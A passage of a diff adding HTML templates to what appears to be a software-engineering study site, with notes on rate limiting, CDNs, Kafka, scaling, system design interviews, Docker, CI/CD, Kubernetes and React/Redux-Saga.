+  data-bridge="Rate limiting protects your origin servers; CDNs reduce how often requests reach them at all. This note covers how edge networks cache content, terminate TLS close to users, and absorb traffic at global scale.">
+<h3>Token Bucket (Burst Handling)</h3>
+<pre>
+  Bucket capacity: 100 tokens
+  Refill rate: 10 tokens/sec
+
+  Burst of 100 requests → all allowed (bucket had 100)
+  101st request → 429 Too Many Requests (bucket empty)
+  Wait 1 second → 10 tokens refill → 10 more allowed
+
+  Allows short bursts while enforcing long-term rate ✓</pre>
+<h3>Strategy Types</h3>
+<table>
+  <thead><tr><th>Strategy</th><th>How</th><th>Use for</th></tr></thead>
+  <tbody>
+    <tr><td>Rate limiting</td><td>Max N requests per time window</td><td>Per-user/IP protection</td></tr>
+    <tr><td>Quota limiting</td><td>Max N requests per day/month</td><td>API pricing tiers</td></tr>
+    <tr><td>Token bucket</td><td>Tokens refill at steady rate</td><td>Allow bursts, enforce average</td></tr>
+  </tbody>
+</table>
+<h3>Where to Enforce</h3>
+<table>
+  <thead><tr><th>Layer</th><th>How</th><th>Best for</th></tr></thead>
+  <tbody>
+    <tr><td>API Gateway</td><td>Before request hits your code</td><td>Centralised, no app changes</td></tr>
+    <tr><td>Application code</td><td>DRF throttle classes, <code>slowapi</code></td><td>Per-endpoint granularity</td></tr>
+    <tr><td>Redis-backed counters</td><td><code>INCR</code> + <code>EXPIRE</code> per user/IP</td><td>Distributed horizontally-scaled apps</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-07-04" data-type="node" data-trail="trail-07" data-order="4"
+  data-title="CDN Concepts and AWS CloudFront"
+  data-file="CDN Concepts &amp; AWS CloudFront Developer Flow.md"
+  data-bridge="CDNs handle static content at scale. For event-driven architectures, Kafka handles the dynamic workload: decoupling services with durable, ordered, partitioned message streams.">
+<h3>Without vs With CDN</h3>
+<div class="compare">
+  <div><h4>Without CDN</h4><pre>User in Sydney
+    │ (request to Virginia)
+    │ ~250ms round trip
+    ▼
+Origin server</pre></div>
+  <div><h4>With CDN</h4><pre>User in Sydney
+    │ (goes to nearest PoP)
+    ▼
+Edge server in Sydney
+~5ms round trip ✓</pre></div>
+</div>
+<h3>Edge Server Capabilities</h3>
+<ul>
+  <li><strong>Reverse proxy + caching</strong>: serve cached responses; origin only hit on cache miss</li>
+  <li><strong>TLS termination</strong>: expensive TLS handshake happens at the edge, close to user</li>
+  <li><strong>DDoS absorption</strong>: Anycast routes attack traffic to all PoPs, spreading load</li>
+  <li><strong>Asset optimisation</strong>: minify JS, convert images to WebP/AVIF at edge</li>
+</ul>
+<h3>CloudFront + S3 Workflow</h3>
+<pre>
+  1. npm run build → minified static files
+  2. aws s3 sync build/ s3://my-bucket
+  3. Create CloudFront distribution → Origin: S3 bucket
+  4. Point DNS (Route 53) → CloudFront URL
+  5. On every deploy: create CloudFront invalidation
+     aws cloudfront create-invalidation --paths "/*"
+  6. Security: Origin Access Control (OAC) → assets
+     served ONLY via CloudFront, not directly from S3</pre>
+<h3>Cache Invalidation Strategies</h3>
+<table>
+  <thead><tr><th>Strategy</th><th>How</th><th>Use when</th></tr></thead>
+  <tbody>
+    <tr><td>Explicit invalidation</td><td>Push invalidation on deploy</td><td>Assets change on release</td></tr>
+    <tr><td>Versioned URLs</td><td><code>/app.v3.js</code> — cached forever</td><td>JS/CSS bundles with content hash</td></tr>
+    <tr><td>Short TTL</td><td>Cache for 5 min</td><td>HTML, frequently changing pages</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-07-05" data-type="node" data-trail="trail-07" data-order="5"
+  data-title="Kafka: Distributed Messaging System"
+  data-file="Kafka Distributed Messaging System (Video Summary).md"
+  data-bridge="With every scaling layer understood individually, this note assembles them at extreme scale — 1M RPS benchmarks, framework ceilings, the Redis write-behind pattern, and why network cards become the final bottleneck.">
+<h3>Architecture</h3>
+<pre>
+  PRODUCERS → BROKERS (Kafka servers) → CONSUMERS
+  ─────────────────────────────────────────────────────────
+  Producer A ──┐                         ┌──► Consumer Group 1
+  Producer B ──┼──► Topic "orders"       │        ├── Consumer 1 (Partition 0)
+               │      ├── Partition 0 ───┤        └── Consumer 2 (Partition 1)
+               │      └── Partition 1 ───┘
+               │    (each partition = ordered, append-only log)
+  Messages stored on broker for configurable retention (2+ weeks default).
+  Consumers PULL; track progress via OFFSET.</pre>
+<h3>Consumer Groups → Exactly-Once</h3>
+<pre>
+  Topic "orders", Consumer Group A:
+  Partition 0 ──► Consumer 1 (exclusively)
+  Partition 1 ──► Consumer 2 (exclusively)
+  ONE partition → ONE consumer within a group
+  → prevents duplicate processing ✓</pre>
+<h3>Delivery Guarantees</h3>
+<table>
+  <thead><tr><th>Guarantee</th><th>ACK when</th><th>Risk</th></tr></thead>
+  <tbody>
+    <tr><td>At-most-once</td><td>Before processing</td><td>Messages lost on crash</td></tr>
+    <tr><td>At-least-once</td><td>After processing</td><td>Duplicates possible</td></tr>
+    <tr><td>Exactly-once</td><td>Via consumer groups + idempotent producers</td><td>Complex setup</td></tr>
+  </tbody>
+</table>
+<h3>Performance Optimisations</h3>
+<ul>
+  <li><strong>Batching</strong>: producers batch messages (up to 50 KB); consumers batch-fetch. Reduces network round-trips.</li>
+  <li><strong>Zero-copy</strong>: disk → kernel buffer → NIC directly (skips user-space copy). ~2× faster, lower memory, avoids Java GC pressure.</li>
+  <li>LinkedIn processes 7 trillion messages per day</li>
+  <li>Ordering guaranteed within one partition; not across partitions</li>
+</ul>
+</template>
+
+<template id="node-07-06" data-type="node" data-trail="trail-07" data-order="6"
+  data-title="Handling 1 Million Requests Per Second"
+  data-file="Scaling/Handling 1M Requests.md"
+  data-bridge="The 1M RPS case study shows the ceiling; this note covers the general toolkit — connection pooling, profiling, caching — for the more common task of improving performance before you hit that ceiling.">
+<h3>Managed API Costs at Scale</h3>
+<table>
+  <thead><tr><th>Provider</th><th>Est. cost at 1M RPS/month</th></tr></thead>
+  <tbody>
+    <tr><td>OpenWeather API</td><td>~$3.8 Billion</td></tr>
+    <tr><td>Amazon API calls</td><td>~$3.9 Million</td></tr>
+    <tr><td>Cloudflare Workers</td><td>~$1 Million</td></tr>
+    <tr><td>Self-managed AWS C8GN (192 cores, 600 Gbps)</td><td>~$8,000 ✓</td></tr>
+  </tbody>
+</table>
+<h3>Scaling Tiers</h3>
+<pre>
+  Tier 1: Single node
+    Express ~20K RPS  |  Fastify/Cpeak ~77K  |  C++ Drogon ~1.2M
+
+  Tier 2: Multiple workers (PM2 / Uvicorn --workers)
+    1 worker per CPU core → 128 cores = 128 parallel processes
+
+  Tier 3: Redis in-memory layer
+    PostgreSQL: ~1K writes/sec (disk I/O limit)
+    Redis single: ~100-150K ops/sec
+    Redis Cluster (30 nodes): ~1M writes/sec
+
+  Tier 4: Language + hardware
+    C++ for compute-critical paths
+    100+ Gbps NIC (30KB × 1M RPS = 38 GB/s network traffic)</pre>
+<h3>Write-Behind Pattern</h3>
+<pre>
+  Problem: PostgreSQL can't handle 1M writes/sec (disk I/O)
+
+  Step 1 — Ingest: client → write to Redis (RAM) → ACK immediately
+  Step 2 — Queue:  Redis stores pending IDs in a list/set
+  Step 3 — Sync:   background worker drains Redis → batch INSERT to Postgres
+
+  Redis absorbs 1M writes/sec in RAM.
+  Postgres receives batched writes it can handle.</pre>
+<h3>Memory vs Disk</h3>
+<table>
+  <thead><tr><th>Storage</th><th>Access latency</th><th>Throughput</th></tr></thead>
+  <tbody>
+    <tr><td>RAM</td><td>~100 ns</td><td>~50 GB/s</td></tr>
+    <tr><td>NVMe SSD</td><td>~50,000 ns</td><td>~3 GB/s</td></tr>
+    <tr><td>SATA SSD</td><td>~200,000 ns</td><td>~500 MB/s</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-07-07" data-type="node" data-trail="trail-07" data-order="7"
+  data-title="Performance Improvement Concepts"
+  data-file="Performance Improvement Concepts.md"
+  data-bridge="">
+<h3>Connection Pooling</h3>
+<div class="compare">
+  <div><h4>Without pooling</h4><pre>Request → open DB connection
+         → execute query
+         → close DB connection
+TCP handshake + auth per request
+SLOW at scale ✗</pre></div>
+  <div><h4>With pooling</h4><pre>App starts → 20 connections pre-created
+Request → grab from pool
+         → execute query
+         → return to pool
+Reuse existing connections ✓</pre></div>
+</div>
+<h3>Profiling: Find the Real Bottleneck</h3>
+<table>
+  <thead><tr><th>Type</th><th>What it finds</th><th>Tools</th></tr></thead>
+  <tbody>
+    <tr><td>CPU profiling</td><td>Which functions consume most CPU time</td><td>cProfile (Python), perf (Linux), node --prof</td></tr>
+    <tr><td>Memory profiling</td><td>Allocations and leaks</td><td>memory_profiler (Python), heapdump (Node)</td></tr>
+    <tr><td>DB profiling</td><td>Slow queries, missing indexes</td><td>EXPLAIN ANALYZE (Postgres), slow query log</td></tr>
+    <tr><td>I/O profiling</td><td>File reads, network, disk bottlenecks</td><td>strace, iotop, network monitor</td></tr>
+  </tbody>
+</table>
+<h3>General Performance Checklist</h3>
+<table>
+  <thead><tr><th>Layer</th><th>Lever</th><th>Impact</th></tr></thead>
+  <tbody>
+    <tr><td>DB queries</td><td>Add missing index</td><td>High — O(n) → O(log n)</td></tr>
+    <tr><td>DB connections</td><td>Add connection pool</td><td>Medium — eliminates TCP overhead</td></tr>
+    <tr><td>Repeated computation</td><td>Cache result (Redis / in-memory)</td><td>High — ms → µs</td></tr>
+    <tr><td>External API calls</td><td>Batch + cache responses</td><td>High — reduce N calls to 1</td></tr>
+    <tr><td>Static assets</td><td>CDN</td><td>High — reduce latency + origin load</td></tr>
+    <tr><td>DB reads</td><td>Read replicas</td><td>High — split read load</td></tr>
+  </tbody>
+</table>
+<div class="warn">Always profile first. Fix the actual bottleneck, not the assumed one.</div>
+</template>
+
+<!-- Trail 08: System Design -->
+<template id="node-08-01" data-type="node" data-trail="trail-08" data-order="1"
+  data-title="System Design Primer"
+  data-file="System Design/System Design Primer.md"
+  data-bridge="The primer gives you the vocabulary and estimation framework. The URL shortener is the canonical first case: simple enough to reason about fully, but it exercises every fundamental — hashing, caching, read replicas, and redirect trade-offs.">
+<h3>Back-of-Envelope Estimation</h3>
+<pre>
+  1. Estimate DAU × actions/user/day = ops/day
+     e.g. 100M DAU × 10 actions = 1B ops/day
+
+  2. Convert to QPS: 1B / 86,400 ≈ 11,600 QPS
+
+  3. Split read/write: 90/10 ratio typical
+     Read QPS = 10,400  |  Write QPS = 1,160
+
+  4. Storage: 10,000 new posts/day × 1 KB = 10 MB/day
+     Over 5 years: 18 GB (trivial)</pre>
+<h3>Leader-Follower for Read Scaling</h3>
+<pre>
+  Read-heavy system:
+
+  Application:
+    writes → Leader DB (replicates WAL → followers)
+    reads  → Follower 1
+    reads  → Follower 2
+
+  Routing options:
+    App code: DB_WRITE_URL + DB_READ_URL
+    Aurora: writer endpoint + reader endpoint (AWS manages)
+    PgBouncer / MySQL Router: proxy does splitting</pre>
+<h3>Read-Your-Writes Problem</h3>
+<pre>
+  User creates post (write → leader)
+  User immediately refreshes (read → stale follower)
+  Post appears missing! ✗
+
+  Fix: read user's OWN data from leader;
+       others' data from followers.</pre>
+<h3>Key Trade-offs to State in Interviews</h3>
+<table>
+  <thead><tr><th>Decision</th><th>Trade-off</th></tr></thead>
+  <tbody>
+    <tr><td>SQL vs NoSQL</td><td>Consistency + joins vs horizontal scale</td></tr>
+    <tr><td>Sync vs async replication</td><td>Durability vs write latency</td></tr>
+    <tr><td>Cache vs DB for hot data</td><td>Speed vs consistency</td></tr>
+    <tr><td>Monolith vs microservices</td><td>Simplicity vs independent scaling</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-08-02" data-type="node" data-trail="trail-08" data-order="2"
+  data-title="Design URL Shortener"
+  data-file="System Design/Design URL Shortner.md"
+  data-bridge="URL shortener is a key-value lookup at scale. TikTok raises the complexity: video transcoding pipelines, CDN distribution, social graph queries, and personalized feed generation all arrive simultaneously.">
+<h3>301 vs 302 — Critical Trade-off</h3>
+<div class="compare">
+  <div><h4>301 Moved Permanently</h4><pre>Browser CACHES the redirect
+Future visits skip your server
+Good: SEO
+Bad: analytics (you lose hits)</pre></div>
+  <div><h4>302 Found (Temporary)</h4><pre>Browser does NOT cache
+Every visit hits your server
+Good: analytics tracking ✓
+Use this for URL shorteners</pre></div>
+</div>
+<h3>URL Generation Strategies</h3>
+<table>
+  <thead><tr><th>Strategy</th><th>How</th><th>Pro</th><th>Con</th></tr></thead>
+  <tbody>
+    <tr><td>Counter + Base62</td><td>Redis INCR → encode</td><td>No collisions</td><td>Counter = SPOF, guessable</td></tr>
+    <tr><td>Random string</td><td>7 random Base62 chars</td><td>No SPOF</td><td>Rare collision check needed</td></tr>
+    <tr><td>Hash</td><td>MD5/SHA-256 first 7 chars</td><td>Deterministic</td><td>Collision possible</td></tr>
+  </tbody>
+</table>
+<div class="info">Base62 (0-9, a-z, A-Z): 62^7 = ~3.5 trillion combinations. For 5 billion URLs, collision probability is very low.</div>
+<h3>Scaled Architecture</h3>
+<pre>
+  Internet → LB → URL Service → Postgres (indexed short_code)
+                       │
+                       └── Redis (hot URL cache)
+
+  Read path (10K RPS):
+    short_code → check Redis (80% hit rate)
+    miss → query Postgres → write back to cache
+
+  Analytics write path:
+    increment → Redis (not Postgres directly!)
+    background job: flush Redis counts to Postgres every 60s
+    → avoids Postgres write per redirect</pre>
+</template>
+
+<template id="node-08-03" data-type="node" data-trail="trail-08" data-order="3"
+  data-title="Design TikTok"
+  data-file="System Design/Design TikTok.md"
+  data-bridge="TikTok's challenge is read-heavy scale. Google Docs introduces a harder problem: multiple writers on the same document simultaneously, where Operational Transform must resolve conflicts in real time.">
+<h3>Scale Estimation</h3>
+<pre>
+  1M DAU × 2 uploads/day × 5 MB = 10 TB/day new storage
+  1M DAU × 30 views/day = 30M views/day → ~350 RPS reads</pre>
+<h3>Architecture</h3>
+<pre>
+  ┌────────────────────────────────────────────────────────────┐
+  │                         CLIENT                              │
+  └────────────┬────────────────────────────┬───────────────────┘
+               │ upload                      │ view feed
+               ▼                             ▼
+  ┌───────────────────┐   ┌─────────────────────────────────────┐
+  │  Upload Service   │   │         Feed Service                │
+  │  1. Accept video  │   │  1. Check Redis (user's top 10)     │
+  │  2. Store → S3    │   │  2. Miss → query Postgres           │
+  │  3. Meta → Postgres│  │  3. Precache service fills cache    │
+  └───────────────────┘   └─────────────────────────────────────┘
+         │                              │
+         ▼                              ▼
+  Async transcoding              CDN distributes videos</pre>
+<h3>DB Schema</h3>
+<pre>
+  Users:        user_id, username, follower_count
+  Videos:       video_id, user_id (FK), s3_url, caption, created_at
+  UserActivity: activity_id, user_id (FK), video_id (FK), type (like/follow)</pre>
+<h3>Scaling Strategies</h3>
+<table>
+  <thead><tr><th>Bottleneck</th><th>Mitigation</th></tr></thead>
+  <tbody>
+    <tr><td>Read-heavy feed</td><td>Redis cache + read replicas</td></tr>
+    <tr><td>Viral video traffic</td><td>CDN caches popular videos at edge</td></tr>
+    <tr><td>High write load</td><td>DB sharding by user_id or region</td></tr>
+    <tr><td>Feed for power users (10M followers)</td><td>Fan-out on write vs fan-out on read trade-off</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-08-04" data-type="node" data-trail="trail-08" data-order="4"
+  data-title="Design Google Docs"
+  data-file="System Design/Google Docs System Design – Interview Summary.md"
+  data-bridge="">
+<h3>Operational Transform — The Core Idea</h3>
+<pre>
+  String: "Hello!"
+  User A (position 5): insert ","    → "Hello,!"
+  User B (position 5): insert " world"
+
+  Without OT: "Hello world,!" ✗ (wrong order)
+  With OT: transform B's position: 5 → 6 (A inserted 1 char before)
+  Result:  "Hello, world!" ✓
+
+  Server is the source of truth for edit ordering.
+  Clients apply OT locally for optimistic updates.</pre>
+<h3>Architecture</h3>
+<pre>
+  ┌────────────────────────────────────────────────────────────┐
+  │  Client A                          Client B                │
+  └──────────────┬─────────────────────────┬───────────────────┘
+                 │ WebSocket               │ WebSocket
+                 ▼                         ▼
+  ┌────────────────────────────────────────────────────────────┐
+  │          WebSocket Service (STATEFUL!)                      │
+  │  All users on same doc → same instance                     │
+  │  Routing: consistent hashing by document_id               │
+  └────────────────┬───────────────────────────────────────────┘
+                   │
+       ┌───────────┴────────────┐
+       ▼                        ▼
+  ┌──────────────┐   ┌────────────────────────────────────┐
+  │ Object Store │   │ Cassandra (recent edits)           │
+  │ S3 snapshots │   │ Heavy-write optimised              │
+  └──────────────┘   └────────────────────────────────────┘</pre>
+<h3>Hybrid Storage Strategy</h3>
+<pre>
+  User opens doc:
+    1. Fetch base snapshot from Object Storage (via CDN)
+    2. Fetch recent edits from Cassandra
+    3. Apply edits locally → current state
+
+  Room reaches 0 connections:
+    1. Trigger compaction worker via message queue
+    2. Apply edits → new snapshot in Object Storage
+    3. Tombstone edits in Cassandra
+    (keep tombstones for version history)</pre>
+<h3>Client Optimisations</h3>
+<table>
+  <thead><tr><th>Optimisation</th><th>What it does</th></tr></thead>
+  <tbody>
+    <tr><td>Debouncing</td><td>Don't send every keystroke; batch edits</td></tr>
+    <tr><td>Optimistic updates</td><td>Apply edit locally before server confirms</td></tr>
+    <tr><td>OT vs CRDT</td><td>OT = ordered list algorithm; CRDT = auto-merge data types (Google may have migrated)</td></tr>
+  </tbody>
+</table>
+</template>
+
+<!-- Trail 09: DevOps & Infrastructure -->
+<template id="node-09-01" data-type="node" data-trail="trail-09" data-order="1"
+  data-title="Docker: Containers and Registries"
+  data-file="Docker Container vs Registry.md"
+  data-bridge="Docker gives you the unit of deployment. Jenkins automates what you do with it: a pipeline that builds, tests, and deploys that container on every code change.">
+<h3>Container vs Virtual Machine</h3>
+<div class="compare">
+  <div><h4>Virtual Machine</h4><pre>┌──────────┐ ┌──────────┐
+│ Guest OS │ │ Guest OS │
+├──────────┴─┴──────────┤
+│     Hypervisor        │
+├───────────────────────┤
+│  Host OS + Hardware   │
+Size: GBs | Boot: minutes</pre></div>
+  <div><h4>Container</h4><pre>┌──────────┐ ┌──────────┐
+│  Libs    │ │  Libs    │
+├──────────┴─┴──────────┤
+│  Container Runtime    │
+├───────────────────────┤
+│  Host OS + Hardware   │
+Size: MBs | Boot: seconds ✓</pre></div>
+</div>
+<h3>Image → Container → Registry</h3>
+<pre>
+  Dockerfile (recipe)
+    ↓ docker build
+  IMAGE (blueprint, read-only)
+    ↓ docker run
+  CONTAINER (running instance)
+
+  REGISTRY (where images are stored):
+    Docker Hub (public):  docker pull nginx:latest
+    AWS ECR (private):    docker pull 123456.dkr.ecr...
+    GitLab Registry:      docker pull registry.gitlab.com/team/app</pre>
+<h3>Docker Compose (Multi-Container)</h3>
+<pre>
+  services:
+    web:
+      build: .
+      ports: ["5000:5000"]
+      depends_on: [db]
+    db:
+      image: postgres:15
+      environment:
+        POSTGRES_PASSWORD: secret
+
+  docker compose up   → starts both containers, wired together
+  docker compose down → stops and removes</pre>
+</template>
+
+<template id="node-09-02" data-type="node" data-trail="trail-09" data-order="2"
+  data-title="Jenkins CI/CD Walkthrough"
+  data-file="Jenkins &amp; CI CD Walkthrough.md"
+  data-bridge="Jenkins is self-hosted and highly configurable. GitHub Actions and GitLab CI/CD bring the same automation as YAML files living alongside the code — the git-native approach most teams use day-to-day.">
+<h3>CI vs CD</h3>
+<div class="compare">
+  <div><h4>CI (Continuous Integration)</h4><ul><li>Developers merge code frequently</li><li>Automated build + tests on every commit</li><li>Catch bugs early in the cycle</li></ul></div>
+  <div><h4>CD (Continuous Delivery)</h4><ul><li>Automate the path to production</li><li>Every passing build is a release candidate</li><li>Deployments become routine, not stressful</li></ul></div>
+</div>
+<h3>Jenkins Pipeline Stages</h3>
+<pre>
+  ┌───────────┐   ┌───────────┐   ┌──────────────────┐
+  │  Checkout │──►│   Build   │──►│       Test       │
+  │ (git pull)│   │(docker    │   │(unit, integration│
+  └───────────┘   │ build)    │   │ tests)           │
+                  └───────────┘   └────────┬─────────┘
+                                           │
+  ┌───────────┐   ┌───────────┐   ┌────────▼─────────┐
+  │  Deploy   │◄──│  Archive  │◄──│  Code Analysis   │
+  └───────────┘   │(artifact) │   │ (SonarQube, lint)│
+                  └───────────┘   └──────────────────┘</pre>
+<ul>
+  <li>Jenkins is self-hosted and highly configurable — wide plugin ecosystem</li>
+  <li><code>Jenkinsfile</code> lives in the repo alongside code — pipeline-as-code</li>
+  <li>6-step setup: Java JDK → download Jenkins → create pipeline job → configure scripts → execute → monitor</li>
+</ul>
+</template>
+
+<template id="node-09-03" data-type="node" data-trail="trail-09" data-order="3"
+  data-title="GitHub and GitLab CI/CD"
+  data-file="Github Gitlab CI CD.md"
+  data-bridge="CI/CD automates deploying containers; Kubernetes orchestrates them in production — scheduling pods across nodes, health-checking, scaling, and providing service discovery.">
+<h3>Your GitLab Pipeline Stages</h3>
+<pre>
+  ┌─────────────┐   ┌─────────────┐   ┌──────────────┐
+  │    build    │──►│  deploy-dev │──►│  build-tag   │
+  │ docker build│   │ deploy to   │   │ build image  │
+  │ push to ECR │   │ dev env     │   │ with git tag │
+  └─────────────┘   └─────────────┘   └──────┬───────┘
+                                              │
+           ┌───────────────┬─────────────────►│
+           ▼               ▼                  ▼
+  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐
+  │  deploy-uat  │ │ deploy-demo  │ │ deploy-prod  │
+  │  terraform   │ │  terraform   │ │  (manual     │
+  │ plan + apply │ │ plan + apply │ │   approval)  │
+  └──────────────┘ └──────────────┘ └──────────────┘</pre>
+<h3>Key Practices</h3>
+<ul>
+  <li><strong>Secure CI/CD variables</strong>: store AWS credentials, DB passwords in CI/CD settings — never hardcode in <code>.gitlab-ci.yml</code></li>
+  <li><strong>Infrastructure as Code (Terraform)</strong>: <code>terraform plan</code> previews changes; <code>terraform apply</code> executes them</li>
+  <li><strong>Least privilege</strong>: CI/CD IAM role has only the permissions it needs</li>
+</ul>
+<table>
+  <thead><tr><th></th><th>Jenkins</th><th>GitHub Actions</th><th>GitLab CI/CD</th></tr></thead>
+  <tbody>
+    <tr><td>Hosting</td><td>Self-hosted</td><td>Cloud (GitHub)</td><td>Cloud (GitLab)</td></tr>
+    <tr><td>Config</td><td>Jenkinsfile</td><td>.github/workflows/*.yml</td><td>.gitlab-ci.yml</td></tr>
+    <tr><td>Best for</td><td>Complex custom pipelines</td><td>GitHub repos, OSS</td><td>GitLab repos, full DevOps</td></tr>
+  </tbody>
+</table>
+</template>
+
+<template id="node-09-04" data-type="node" data-trail="trail-09" data-order="4"
+  data-title="Kubernetes"
+  data-file="Kubernetes.md"
+  data-bridge="">
+<h3>Cluster Architecture</h3>
+<pre>
+  ┌─────────────────────────────────────────────────────────────┐
+  │                    KUBERNETES CLUSTER                        │
+  │                                                             │
+  │  ┌─────────────────────────────────┐                       │
+  │  │         MASTER NODE             │                       │
+  │  │  API Server  Scheduler          │                       │
+  │  │  Controller  etcd (state DB)    │                       │
+  │  └──────────────┬──────────────────┘                       │
+  │                 │ manages                                   │
+  │    ┌────────────┼─────────────────┐                        │
+  │    ▼            ▼                 ▼                        │
+  │ ┌────────┐  ┌────────┐       ┌────────┐                   │
+  │ │Worker 1│  │Worker 2│  ...  │Worker N│                   │
+  │ │kubelet │  │kubelet │       │kubelet │                   │
+  │ │Pod A   │  │Pod B   │       │Pod C   │                   │
+  │ └────────┘  └────────┘       └────────┘                   │
+  └─────────────────────────────────────────────────────────────┘</pre>
+<h3>Core Objects</h3>
+<table>
+  <thead><tr><th>Object</th><th>What it is</th></tr></thead>
+  <tbody>
+    <tr><td>Pod</td><td>Smallest unit; wraps 1+ containers; ephemeral (dies and gets replaced)</td></tr>
+    <tr><td>Service</td><td>Permanent IP + DNS name for a pod set; acts as internal LB</td></tr>
+    <tr><td>Ingress</td><td>Routes external HTTP traffic by domain name / URL path</td></tr>
+    <tr><td>ConfigMap</td><td>External config (URLs, endpoints) without rebuilding the image</td></tr>
+    <tr><td>Secret</td><td>Sensitive data (passwords, certs) stored base64-encoded</td></tr>
+    <tr><td>Volume</td><td>Persistent storage; survives pod restarts</td></tr>
+    <tr><td>Deployment</td><td>Blueprint for stateless apps; manages replicas + rolling deploys</td></tr>
+    <tr><td>StatefulSet</td><td>For stateful apps (DBs); stable identity + own Volume per pod</td></tr>
+  </tbody>
+</table>
+<div class="info"><strong>Self-healing</strong>: K8s always works to match desired state (YAML) to actual state. Pod crashes → Controller creates a new one automatically.</div>
+<ul>
+  <li>etcd is the single source of truth for all cluster state — back it up!</li>
+  <li>NodePort exposes a Service on a port on every node (30000–32767); Ingress is preferred for production</li>
+</ul>
+</template>
+
+<!-- Trail 10: Frontend -->
+<template id="node-10-01" data-type="node" data-trail="trail-10" data-order="1"
+  data-title="SSG, SSR, and Edge Rendering"
+  data-file="Frontend/SSG SSR Edge.md"
+  data-bridge="The rendering strategy shapes every performance decision. React is the component model that powers most of those strategies — virtual DOM, hooks, and unidirectional data flow.">
+<h3>Where Is HTML Generated?</h3>
+<table>
+  <thead><tr><th></th><th>Server Components</th><th>Client Components</th><th>Edge Functions</th></tr></thead>
+  <tbody>
+    <tr><td>Runs on</td><td>Server (before browser)</td><td>Browser (after page loads)</td><td>CDN edge node</td></tr>
+    <tr><td>JS in browser</td><td>No</td><td>Yes</td><td>Yes (on CDN server)</td></tr>
+    <tr><td>Best for</td><td>Static content, SEO, API calls</td><td>Interactivity, events</td><td>Real-time personalisation</td></tr>
+    <tr><td>Performance</td><td>Fast (no hydration)</td><td>Slower (hydration needed)</td><td>Fastest (global CDN)</td></tr>
+  </tbody>
+</table>
+<h3>Four Rendering Strategies</h3>
+<pre>
+  CSR (Client-Side):  empty HTML + JS bundle → browser builds DOM
+                      First paint slow | SEO poor
+
+  SSR (Server-Side):  server fetches data + builds HTML per request
+                      First paint fast | SEO excellent | needs hydration
+
+  SSG (Static):       HTML built ONCE at build time → served from CDN
+                      Fastest possible | SEO excellent | stale on rebuild only
+
+  Edge:               SSR runs at CDN edge (close to user)
+                      Ultra-low latency + personalisation</pre>
+<h3>Next.js APIs</h3>
+<pre>
+  SSG: export async function getStaticProps() { /* build time */ }
+       export async function getStaticPaths() { /* dynamic routes */ }
+
+  SSR: export async function getServerSideProps(context) { /* per request */ }
+
+  App Router (modern): Server Components by default
+  Add "use client" to opt into client component</pre>
+</template>
+
+<template id="node-10-02" data-type="node" data-trail="trail-10" data-order="2"
+  data-title="React Basics"
+  data-file="Frontend/React Basic Learnings.md"
+  data-bridge="React handles local component state. When multiple components need shared state — or async operations like API calls need management — Redux provides the global immutable store and Redux-Saga handles the side effects.">
+<h3>React's Core Model</h3>
+<pre>
+  UI = f(state)  ← React's fundamental idea
+
+  Component is a function of its state and props.
+  When state changes → React re-renders the component.
+  Diffs new virtual DOM vs old → updates ONLY changed DOM nodes.</pre>
+<h3>Virtual DOM Diffing</h3>
+<div class="compare">
+  <div><h4>Before click</h4><pre>Virtual DOM:
+&lt;div&gt;
+  &lt;button&gt;0&lt;/button&gt;
+  &lt;p&gt;Hello&lt;/p&gt;
+&lt;/div&gt;</pre></div>
+  <div><h4>After click</h4><pre>Virtual DOM:
+&lt;div&gt;
+  &lt;button&gt;1&lt;/button&gt; ← changed
+  &lt;p&gt;Hello&lt;/p&gt;       ← same
+&lt;/div&gt;
+React updates ONLY &lt;button&gt; ✓</pre></div>
+</div>
+<h3>Key Hooks</h3>
+<table>
+  <thead><tr><th>Hook</th><th>Purpose</th></tr></thead>
+  <tbody>
+    <tr><td><code>useState(init)</code></td><td>Local state; re-renders on change</td></tr>
+    <tr><td><code>useEffect(fn, deps)</code></td><td>Side effects (fetch, subscriptions, timers)</td></tr>
+    <tr><td><code>useCallback(fn, deps)</code></td><td>Memoises function reference (avoids child re-renders)</td></tr>
+    <tr><td><code>useMemo(fn, deps)</code></td><td>Memoises computed value (expensive calculations)</td></tr>
+    <tr><td><code>useRef(init)</code></td><td>Mutable value that doesn't trigger re-render; DOM refs</td></tr>
+    <tr><td><code>useContext(ctx)</code></td><td>Read from React Context (lightweight global state)</td></tr>
+  </tbody>
+</table>
+<ul>
+  <li>Props are read-only for the child — parent passes callbacks to receive events from child</li>
+  <li>Unidirectional data flow: data only flows parent → child; two-way is explicit, not automatic</li>
+</ul>
+</template>
+
+<template id="node-10-03" data-type="node" data-trail="trail-10" data-order="3"
+  data-title="React, Redux, and Redux-Saga"
+  data-file="Frontend/React Redux Redux-Saga.md"
+  data-bridge="With the application model complete, the final performance concern is delivery: how the JavaScript bundle reaches the browser. Code splitting, lazy loading, and bundle analysis determine actual time-to-interactive.">
+<h3>Layer Architecture</h3>
+<pre>
+  ┌──────────────────────────────────┐
+  │  React  (UI layer)               │
+  └──────────────────┬───────────────┘
+                     ↓ dispatch action
+  ┌──────────────────────────────────┐
+  │  Redux  (state layer)            │
+  └──────────────────┬───────────────┘
+                     ↓ action hits middleware
+  ┌──────────────────────────────────┐
+  │  Redux-Saga  (side effects)      │
+  └──────────────────┬───────────────┘
+                     ↓
+  ┌──────────────────────────────────┐
+  │  API / External Services         │
+  └──────────────────────────────────┘</pre>
+<h3>Complete Data Flow</h3>
+<pre>
+  User clicks button
+    ↓ dispatch({ type: 'FETCH_USER', payload: userId })
+  Saga middleware intercepts FETCH_USER
+    ↓ spawns Worker Saga
+  yield call(api.fetchUser, userId)  ← async API call
+    ↓ API returns user
+  yield put({ type: 'SET_USER', payload: user })
+    ↓ Reducer handles SET_USER
+  Redux store updates
+    ↓ useSelector re-renders
+  UI shows user data ✓</pre>
+<h3>Watcher + Worker Pattern</h3>
+<pre>
+  // Watcher: listens for actions
+  function* watchFetchUser() {
+    yield takeEvery('FETCH_USER', fetchUserSaga);
+  }
+  // Worker: does the async work
+  function* fetchUserSaga(action) {
+    try {
+      const user = yield call(api.fetchUser, action.payload);
+      yield put({ type: 'SET_USER', payload: user });
+    } catch (e) {
